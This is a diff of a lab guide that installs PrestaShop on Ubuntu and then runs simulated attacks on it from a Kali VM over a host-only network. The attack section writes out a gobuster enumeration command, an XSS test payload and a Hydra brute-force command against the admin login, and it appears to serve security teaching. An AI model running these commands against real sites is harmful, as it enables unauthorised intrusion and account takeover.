@@ -67,55 +67,49 @@ sudo apt update && sudo apt upgrade -y
 
 ### 1.2 Install Apache
 Install Apache and enable the service:
-
 ```
 sudo apt install apache2 -y
--
 sudo systemctl enable apache2
--
 sudo systemctl start apache2
 ```
+
 ### 1.3 Install & Configure MariaDB
 Install MariaDB and start the service:
+```
+sudo apt install mariadb-server mariadb-client -y
+sudo systemctl enable mariadb  
+sudo systemctl start mariadb
+```
 
-```
-`sudo apt install mariadb-server mariadb-client -y`  
-`sudo systemctl enable mariadb`  
-`sudo systemctl start mariadb`
-```
 **Create the database and user for PrestaShop:**
-
-```sql
+```
 sudo mysql -u root -p
 ```
-CREATE DATABASE prestashop CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci; 
 
-CREATE USER 'psuser'@'localhost' IDENTIFIED BY 'StrongPasswordHere'; 
-
-GRANT ALL PRIVILEGES ON prestashop.* TO 'psuser'@'localhost'; 
-
-FLUSH PRIVILEGES; 
-
-EXIT;
+CREATE DATABASE prestashop CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;  
+CREATE USER 'psuser'@'localhost' IDENTIFIED BY 'StrongPasswordHere';  
+GRANT ALL PRIVILEGES ON prestashop.* TO 'psuser'@'localhost';  
+FLUSH PRIVILEGES;  
+EXIT;  
 
 > **Important:** Replace `StrongPasswordHere` with a strong, unique password. You will need the `psuser` username and this password during web installation.
 
 ### 1.4 Install PHP 8.3 & Required Extensions
 Install PHP and extensions:
 ```
-`sudo apt install php8.3-zip`  
-`sudo apt install php8.3-gd php8.3-curl php8.3-intl php8.3-mbstring php8.3-xml php8.3-mysql`  
-`sudo apt install php8.3-cli php8.3-common php8.3-soap php8.3-opcache libapache2-mod-php8.3 -y`  
-`php -v`
+sudo apt install php8.3-zip
+sudo apt install php8.3-gd php8.3-curl php8.3-intl php8.3-mbstring php8.3-xml php8.3-mysql  
+sudo apt install php8.3-cli php8.3-common php8.3-soap php8.3-opcache libapache2-mod-php8.3 -y  
+php -v
 ```
 
 ### 1.5 Configure PHP
 Edit **/etc/php/8.3/apache2/php.ini**
 ```
-`sudo nano /etc/php/8.3/apache2/php.ini`
+sudo nano /etc/php/8.3/apache2/php.ini
 ```
 
-Then inside file, set:
+**Then inside file, set:**  
 - memory_limit = 512M 
 - upload_max_filesize = 64M 
 - post_max_size = 64M 
@@ -123,66 +117,73 @@ Then inside file, set:
 - max_input_time = 300 
 - date.timezone = Europe/Bucharest
 
-Restart Apache:
+**Restart Apache:**
 ```
-`sudo systemctl restart apache2`
+sudo systemctl restart apache2
 ```
 
 ### 1.6 Download & Deploy PrestaShop
 Download PrestaShop and deploy:
-
-`cd /tmp`  
-`wget https://github.com/PrestaShop/PrestaShop/releases/download/8.1.5/prestashop_8.1.5.zip`  
-`sudo apt install unzip -y`  
-`unzip prestashop_8.1.5.zip -d prestashop`  
-`sudo mv prestashop /var/www/html/`  
-`sudo chown -R www-data:www-data /var/www/html/prestashop`  
-`sudo chmod -R 755 /var/www/html/prestashop`
+```
+cd /tmp 
+wget https://github.com/PrestaShop/PrestaShop/releases/download/8.1.5/prestashop_8.1.5.zip
+sudo apt install unzip -y  
+unzip prestashop_8.1.5.zip -d prestashop  
+sudo mv prestashop /var/www/html/  
+sudo chown -R www-data:www-data /var/www/html/prestashop
+sudo chmod -R 755 /var/www/html/prestashop
+```
 
 ### 1.7 Configure Apache Virtual Host
 Create **/etc/apache2/sites-available/prestashop.conf:**
+```
+sudo nano /etc/apache2/sites-available/prestashop.conf
+```
 
-`sudo nano /etc/apache2/sites-available/prestashop.conf`
+**Inside the file, add:**
 
-Inside the file, add:
+<VirtualHost *:80>  
+ServerName yourdomain.com  
+DocumentRoot /var/www/html/prestashop  
 
-<VirtualHost *:80>
-ServerName yourdomain.com
-DocumentRoot /var/www/html/prestashop
+<Directory /var/www/html/prestashop>  
+    AllowOverride All  
+    Require all granted  
+</Directory>  
 
-<Directory /var/www/html/prestashop>
-    AllowOverride All
-    Require all granted
-</Directory>
+ErrorLog ${APACHE_LOG_DIR}/prestashop_error.log  
+CustomLog ${APACHE_LOG_DIR}/prestashop_access.log combined  
+</VirtualHost>  
 
-ErrorLog ${APACHE_LOG_DIR}/prestashop_error.log
-CustomLog ${APACHE_LOG_DIR}/prestashop_access.log combined
-</VirtualHost>
-
-Enable site and rewrite module:
-
-`sudo a2ensite prestashop`  
-`sudo a2enmod rewrite`  
-`sudo systemctl reload apache2`
+**Enable site and rewrite module:**
+```
+sudo a2ensite prestashop  
+sudo a2enmod rewrite  
+sudo systemctl reload apache2
+```
 
 ### 1.8 Finalize Installation
 Open a browser and access:
+```
+http://<YOUR_UBUNTU_IP>/prestashop
+```
 
-`http://<YOUR_UBUNTU_IP>/prestashop`
-
-Complete the web installation wizard (language, license, database, admin account).  
+**Complete the web installation wizard (language, license, database, admin account).**
 
 Find the randomized admin folder:
+```
+ls /var/www/html/prestashop | grep admin
+```
 
-`ls /var/www/html/prestashop | grep admin`
+**To Access Admin Panel:**
+```
+http://<YOUR_UBUNTU_IP>/prestashop/<admin_folder_name>
+```
 
-To Access Admin Panel:
-
-`http://<YOUR_UBUNTU_IP>/prestashop/<admin_folder_name>`
-
-Remove the installation directory:
-
-`sudo rm -rf /var/www/html/prestashop/install`
+**Remove the installation directory:**
+```
+sudo rm -rf /var/www/html/prestashop/install
+```
 
 ---
 
@@ -208,32 +209,32 @@ Remove the installation directory:
 Ubuntu PrestaShop target: Initially accessed via 127.0.0.1.  
 Updated PrestaShop URL: Changed inside website configuration to 192.168.56.101 so the Kali attacker VM could reach the site.  
 Kali attacker VM: Used to perform simulated attacks.  
-Network: Host‑Only Adapter for Ubuntu ↔ Kali communication. 
+Network: Host‑Only Adapter for Ubuntu ↔ Kali communication.  
 
 ### 3.2 Attack 1 — Directory Enumeration (Gobuster) 
 ```
-`gobuster dir -u http://192.168.56.101/prestashop -w /usr/share/wordlists/dirb/common.txt`
+gobuster dir -u http://192.168.56.101/prestashop -w /usr/share/wordlists/dirb/common.txt
 ```
 
 Evidence: gobuster_scan.png
 
 3.3 Attack 2 — XSS Injection Test
 ```
-`<script>alert('XSS')</script>`
+<script>alert('XSS')</script>
 ```
 
 Evidence: xss_test_result.png
 
-3.4 Attack 3 — Brute Force Admin Login (Hydra
+3.4 Attack 3 — Brute Force Admin Login (Hydra)
 ```
-`hydra -l admin@example.com -P passwords.txt 192.168.56.101 http-post-form "/prestashop/admin7xk29df/index.php:email=^USER^&passwd=^PASS^:Invalid"`
+hydra -l admin@example.com -P passwords.txt 192.168.56.101 http-post-form "/prestashop/admin7xk29df/index.php:email=^USER^&passwd=^PASS^:Invalid"
 ```
 
 Evidence: hydra_attack.png
 
 Apache log evidence:
 ```
-`sudo tail -n 50 /var/log/apache2/error.log`
+sudo tail -n 50 /var/log/apache2/error.log
 ```
 
 Evidence: apache_log_evidence.png
